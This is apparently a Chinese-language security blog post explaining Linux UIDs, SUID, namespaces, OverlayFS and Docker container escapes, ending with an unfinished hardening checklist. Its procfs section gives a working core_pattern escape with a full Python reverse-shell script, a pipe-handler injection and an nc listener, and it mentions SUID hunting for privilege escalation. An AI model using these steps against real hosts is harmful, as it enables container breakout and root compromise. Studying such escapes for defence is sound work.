---
title: Docker 安全问题浅析
date: 2025-04-03 17:22:00
tags: [Web, 渗透]
categories: 渗透
---

学习一下常用的逃逸手法，以及如何设计一个安全的方案。
<!--more-->

## 前言

自从听说 Docker 给 root 会导致安全风险，潜意识就觉得 Docker 里的 root 和宿主机的 root 是一回事，但是被问到的时候面试官又说特权模式才会有风险，特权用户无所吊谓，不然 Namespaces 干嘛的呢？

## 前置知识

### UID & GID

我们知道，Linux 通过 UID 来标识用户，且 UID 是唯一的，UID 为 0 的用户是 root 用户。
可以通过 `/etc/passwd` 文件来查看用户信息，格式如下：

```bash
kali@cverc:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:102:105::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:103:106:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
syslog:x:104:111::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:113:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:116::/run/uuidd:/usr/sbin/nologin
systemd-oom:x:108:117:systemd Userspace OOM Killer,,,:/run/systemd:/usr/sbin/nologin
tcpdump:x:109:118::/nonexistent:/usr/sbin/nologin
avahi-autoipd:x:110:119:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
kernoops:x:113:65534:Kernel Oops Tracking Daemon,,,:/:/usr/sbin/nologin
avahi:x:114:121:Avahi mDNS daemon,,,:/run/avahi-daemon:/usr/sbin/nologin
cups-pk-helper:x:115:122:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin
rtkit:x:116:123:RealtimeKit,,,:/proc:/usr/sbin/nologin
whoopsie:x:117:124::/nonexistent:/bin/false
sssd:x:118:125:SSSD system user,,,:/var/lib/sss:/usr/sbin/nologin
speech-dispatcher:x:119:29:Speech Dispatcher,,,:/run/speech-dispatcher:/bin/false
fwupd-refresh:x:120:126:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
nm-openvpn:x:121:127:NetworkManager OpenVPN,,,:/var/lib/openvpn/chroot:/usr/sbin/nologin
saned:x:122:129::/var/lib/saned:/usr/sbin/nologin
colord:x:123:130:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
geoclue:x:124:131::/var/lib/geoclue:/usr/sbin/nologin
pulse:x:125:132:PulseAudio daemon,,,:/run/pulse:/usr/sbin/nologin
gnome-initial-setup:x:126:65534::/run/gnome-initial-setup/:/bin/false
hplip:x:127:7:HPLIP system user,,,:/run/hplip:/bin/false
gdm:x:128:134:Gnome Display Manager:/var/lib/gdm3:/bin/false
kali:x:1000:1000:kali,,,:/home/kali:/bin/bash
sshd:x:129:65534::/run/sshd:/usr/sbin/nologin
ftp:x:130:138:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
```

可以看到，用户分为如下几类：

- Root 用户：UID 为 0，拥有最高权限。
- 系统用户：UID 通常为 1-999（不同系统范围可能不同），用于运行系统服务（如 www-data、mysql）。
- 普通用户：UID 从 1000 或 10000 开始分配（依系统而定），供普通用户使用（如上面的 kali）。

文件/进程的访问权限都是基于 UID 进行判断的，进程在运行时会继承启动用户的 UID，决定其资源访问范围。
当然有特殊情况——那就是 setuid。
进程的 UID 其实还细分为 RUID（Real UID）和 EUID（Effective UID），前者是进程实际所有者的 UID，后者则决定进程权限，这就是 SUID（Set User ID） 机制。
刚好发现 WSL 的 `ping` 坏了（虽然我也不确实是不是一直都这样），具体表现就是没权限，详细如下：

```bash
$ ping baidu.com
ping: socktype: SOCK_RAW
ping: socket: Operation not permitted
ping: => missing cap_net_raw+p capability or setuid?
```

前几次都忍了，加个 `sudo` 也能用，但是今天既然都写到这就干脆修一下

```bash
$ ls -l /usr/bin/ping
-rwxr-xr-x 1 root root 156136 Sep 25  2024 /usr/bin/ping
```

执行 `sudo chmod u+s /usr/bin/ping`，再看：

```bash
-rwsr-xr-x 1 root root 156136 Sep 25  2024 /usr/bin/ping
```

可以看到多了个 `s`，即 SUID 的标志位，运行时会将 EUID 设置为文件所有者的 UID（即 root），就可以畅快地 ping 了。

值得一提的是，对于脚本文件（如 `.sh`），SUID 是无效的，只有二进制文件才有效，这也是 Linux 的安全设计，之前做渗透的时候踩过坑。

做渗透测试的时候也可以用 `find / -perm -4000` 命令查找 SUID 文件，利用它们来提权。
日常的生产实践还是优先使用 `sudo` 或者 Capabilities 机制来控制权限，SUID 只在必要时使用。

### Namespaces

Docker 有三大核心机制：

- Namespaces：隔离进程空间
- Cgroups：限制资源使用
- UnionFS：分层文件系统

那么其中 Namespaces 其实是有很多种的：

- Pid Namespaces：进程 ID 隔离
- UTS Namespaces：主机名隔离
- Mount Namespaces：挂载点隔离
- IPC Namespaces：进程间通信隔离
- Network Namespaces：网络隔离

接下来的就是我们今天的主角：User Namespaces，用户隔离。

## User Namespaces

User Namespaces 是 Linux 内核提供的一种隔离机制，可以将容器内的用户 ID 映射到宿主机的用户 ID，从而实现用户层面的隔离。
但是，这个 User Namespaces **不是默认开启的**，需要在 Docker 的配置文件中进行设置。
也就是说，**默认情况下，Docker 里的 root 跟宿主机的 root 就是一回事**，被面试官忽悠了，绷。

以下面的挂载 procfs 逃逸为例，没开 User Namespaces 的情况下，宿主机的 root 直接就被拿下了。

## Docker 逃逸

### 特权模式

### 挂载 Docker Socket

### 挂载 procfs

创建一个容器并挂载 `/proc` 目录

```bash
docker run -it -v /proc/sys/kernel/core_pattern:/host/proc/sys/kernel/core_pattern ubuntu
```

看看有没有两个 `core_pattern` 文件

```bash
find / -name core_pattern
/proc/sys/kernel/core_pattern
/host/proc/sys/kernel/core_pattern
```

找到当前容器在宿主机下的绝对路径

```bash
cat /proc/mounts | xargs -d ',' -n 1 | grep workdir
workdir=/var/lib/docker/overlay2/0868dfee7b168e77da0dc40e8c6d4b0685396c1ee6bb015af76c6a9c5f9a2b49/work
```

这里说一下 `xargs` 命令，`-d` 选项指定分隔符，`-n` 选项指定每次传递给命令的参数个数。
如此其实也可以用如下命令只输出目录

```bash
cat /proc/mounts | xargs -d ',' -n 1 | grep workdir | xargs -d "=" | awk '{print $2}'
```

意思就是当前容器挂载在宿主机的 `/var/lib/docker/overlay2/0868dfee7b168e77da0dc40e8c6d4b0685396c1ee6bb015af76c6a9c5f9a2b49/merged` 目录下，去宿主机 `ls` 一下也可以确认

然后找个位置写一个反弹 shell 的脚本，我这里选择写在 `/tmp/t.py`

```python
#!/usr/bin/python3
import os
import pty
import socket
lhost = "<your_host_ip>"
lport = <your_host_port>
def main():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((lhost, lport))
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)
    os.putenv("HISTFILE", '/dev/null')
    pty.spawn("/bin/bash")
    s.close()
if __name__ == "__main__":
    main()
```

加上执行权限（别忘了！！！）

```bash
chmod +x /tmp/t.py
```

写到宿主机的 `/proc` 目录下

```bash
echo -e "|/var/lib/docker/overlay2/0868dfee7b168e77da0dc40e8c6d4b0685396c1ee6bb015af76c6a9c5f9a2b49/merged/tmp/t.py \rcore    " >  /host/proc/sys/kernel/core_pattern
```

写一个可以触发 core dump 的程序

```c
#include<stdio.h>
int main(void)  {
   int *a  = NULL;
   *a = 1;
   return 0;
}
```

编译一下，执行

```bash
gcc t.c -o t
./t
```

记得在攻击机上开启监听

```bash
nc -lvnp <your_host_port>
```

宿主机 root 的 shell 就弹出来了。

现在说说原理：Linux 有一个核心转储（core dump）机制，当进程崩溃时，内核会将进程的内存映像保存到一个文件，用于调试。

而 `/proc/sys/kernel/core_pattern` 定义了核心转储文件的生成规则。其格式分为现和：

1. 静态路径：如 `/var/crash/core.%p`（`%p` 表示进程 PID）。
2. 管道命令：以 | 开头时，内核会将 core dump 内容通过管道传递给指定程序，格式为：
`| /path/to/program %p [其他参数]`

相信这时候你也看出来了，上面的利用方式实际上是将 core dump 的内容作为参数传递给了 `/tmp/t.py`，而 `/tmp/t.py` 被 root 执行，从而反弹出 shell。

#### 拓展之 OverlayFS

我们知道 Docker 三大核心机制之一是 UnionFS，Docker 采用的是 OverlayFS。
先说 UnionFS，其核心思想就是分层叠加，类似“多层透明纸叠加”的效果，每张纸画不同的内容，叠加在一起就形成了一个完整的图像。
OverlayFS 则是 Linux 内核提供的一种 **UnionFS 的具体实现**。
OverlayFS 需要四个目录：

1. **lowerdir（下层目录）**：只读的基础层（如 Docker 镜像）。
2. **upperdir（上层目录）**：可写层，存放修改后的文件。
3. **merged（合并目录）**：最终用户看到的统一视图，合并了上下层内容。
4. **workdir（工作目录）**：系统内部用于处理文件操作（如临时存放复制的文件）。

**读取**文件时，若文件在 `upperdir` 中存在，则读取 `upperdir` 中的文件；否则读取 `lowerdir` 中的文件。
**修改** `lowerdir` 中的文件时，会触发写时复制（Copy-on-Write）机制，将文件复制到 `upperdir` 中进行修改，原文件保持不变
**删除**文件时，会在 `upperdir` 中标记一个“删除白板”，隐藏下层文件。
最终效果：通过 `merged` 目录，用户可以看到一个合并后的完整的文件系统视图，原始基础镜像（lowerdir）始终不变。

可以概括出如下优点：

- **高效**：无需复制整个基础层，只有修改时才复制单个文件。
- **节省空间**：多个容器可以共享同一基础层，避免重复存储。
- **快速启动**：创建新容器时，只需创建新的 `upperdir` 和 `workdir`，而不需要复制整个文件系统。

现在我们可以瞄一眼文件系统中的实际结构：

```bash
ls /var/lib/docker/overlay2/0868dfee7b168e77da0dc40e8c6d4b0685396c1ee6bb015af76c6a9c5f9a2b49
diff link lower merged work
```

`diff` 是一个目录，对应 `upperdir`，`ls` 一下可以看到里面是一个不完整的容器的根目录，只包含我们修改过的文件。
`link` 是一个文件，存储该层的“短名称”（缩短的哈希值），用于简化目录引用，先不管他。

```bash
cat link
WKXKCJ67B3V6VZNJ7GP4REARER
```

`lower` 是一个文件，对应 `lowerdir`，记录该层的下层目录的哈希值，也待会再说

```bash
cat lower
l/5MMEIBNIEE5KXKNNZLRXW6U2YA:l/JVXDIO6M3RVT6N6O2ETGZQ5IY4
```

`merged` 是一个目录，即最终的合并视图，`ls` 看到的东西跟在容器里 `ls /`是一样的。
`work` 是一个目录，作为处理文件操作的临时工作区，在复制、删除或修改时，系统在这里完成原子操作，确保数据一致性，由 OverlayFS 自动管理。

现在我们再看一下那几个短哈希值

```bash
ls /var/lib/docker/overlay2/l -al
lrwxrwxrwx  1 root root   77  4月 10 21:58 5MMEIBNIEE5KXKNNZLRXW6U2YA -> ../0868dfee7b168e77da0dc40e8c6d4b0685396c1ee6bb015af76c6a9c5f9a2b49-init/diff
lrwxrwxrwx  1 root root   72  4月 10 21:58 WKXKCJ67B3V6VZNJ7GP4REARER -> ../0868dfee7b168e77da0dc40e8c6d4b0685396c1ee6bb015af76c6a9c5f9a2b49/diff
lrwxrwxrwx  1 root root   72  3月 20 15:05 JVXDIO6M3RVT6N6O2ETGZQ5IY4 -> ../78e27d8316131fb2b18adb91fd994cbe73436ed1685123f9e38ab7d36c4b7f52/diff
```

可以看到 `WKXKCJ67B3V6VZNJ7GP4REARER` 作为当前层，里面是有我们在容器里创建的文件的，`5MMEIBNIEE5KXKNNZLRXW6U2YA` 与 `JVXDIO6M3RVT6N6O2ETGZQ5IY4` 属于基础镜像层或者装 Python 之类的依赖后的层，里面的文件就比较朴素。

最终视图可以理解成这样

```plain
容器视图（merged）
├── 可写层（diff）     ← 容器运行时修改的文件
├── 层2（Python 安装）  ← l/JVXDIO6M3RVT6N6O2ETGZQ5IY4
└── 层1（Ubuntu 系统）  ← l/5MMEIBNIEE5KXKNNZLRXW6U2YA
```

### 挂载宿主机根目录

### Docker remote api 未授权访问

## 如何设计一个安全的容器方案

### 安全隐患

未知攻，焉知防？
先说说 Docker 的安全隐患，Docker 的安全隐患主要分为三类：

1. 宿主机的操作系统本身就存在安全隐患
    我们知道，Docker 跟宿主机是共享内核的，所以如果宿主机的内核存在漏洞，那么 Docker 也会受到影响。比如著名的脏牛提权漏洞（CVE-2016-5195）。
2. 容器自身的安全问题
    1. 滥用 Docker API 攻击
    2. Docker 逃逸攻击
    3. 容器间通信的风险
    4. 容器配置不当引起的安全问题
3. 容器镜像安全问题
    1. 无法检测安全性
    2. 不安全的镜像源

### 安全防护

容器的安全防护应该从容器的整个生命周期来考虑，包括一个容器镜像从创建、传输、运行到停止的全过程。

1. 创建阶段
    1. 代码审计
    2. 可信基础镜像
    3. 容器镜像加固
    4. 容器镜像扫描
    5. 基础镜像安全管理
2. 传输阶段
    1. 镜像签名
    2. 用户访问控制
    3. 支持 HTTPS 的镜像仓库
3. 运行阶段
    1. 对容器主机进行加固
    2. 容器安全配置
    3. 容器隔离
    4. 容器安全监控与审计
    5. 容器安全防护与入侵检测
    6. 容器运行时的漏洞扫描
    7. 网络安全防护

// To be continued...

## 参考

[Isolate containers with a user Namespaces](https://docs.docker.com/engine/security/userns-remap/#about-remapping-and-subordinate-user-and-group-ids)
[Docker 魔法解密：探索 UnionFS 与 OverlayFS](https://zhuanlan.zhihu.com/p/679328995)
[T Wiki](https://wiki.teamssix.com/)
